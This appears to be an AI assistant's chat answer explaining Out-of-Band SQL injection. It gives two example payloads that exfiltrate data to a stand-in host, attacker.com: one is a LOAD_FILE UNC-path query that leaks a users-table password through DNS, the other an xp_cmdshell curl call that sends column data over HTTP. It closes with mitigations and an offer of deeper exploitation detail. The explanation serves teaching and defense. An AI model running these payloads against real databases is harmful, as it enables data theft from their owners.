

It looks like you're referring to **Out-of-Band SQL Injection (OOB SQLi)**, which is a type of SQL injection attack where the attacker retrieves data from a database by leveraging external network channels (like DNS, HTTP requests, or other protocols) rather than directly through the application's response.

### **Key Concepts of Out-of-Band SQLi:**
1. **How it Works**:
   - The attacker injects malicious SQL queries that force the database to make an outbound request (e.g., DNS lookup, HTTP call) containing stolen data.
   - The attacker monitors an external server they control to capture the exfiltrated data.

2. **When Used**:
   - When traditional **In-Band (Error-Based/Union-Based)** or **Blind SQLi** techniques don't work.
   - When the database has functions that allow external network interactions (`LOAD_FILE()`, `UTL_HTTP`, `xp_cmdshell`, etc.).

3. **Example Techniques**:
   - **DNS Exfiltration**:  
     ```sql
     SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share\\file.txt'));
     ```
     The database makes a DNS request to `<stolen-data>.attacker.com`, which the attacker logs.

   - **HTTP Requests**:  
     ```sql
     DECLARE @data VARCHAR(1024); 
     SET @data = (SELECT TOP 1 column_name FROM table_name); 
     EXEC('xp_cmdshell ''curl http://attacker.com/?data=' + @data + '''');
     ```

4. **Mitigation**:
   - Disable unnecessary database functions (`xp_cmdshell`, `UTL_HTTP`).
   - Use parameterized queries/prepared statements.
   - Implement strict firewall rules to block outbound requests from databases.
   - Monitor unusual DNS/HTTP traffic from DB servers.

Would you like a deeper dive into exploitation techniques or detection methods?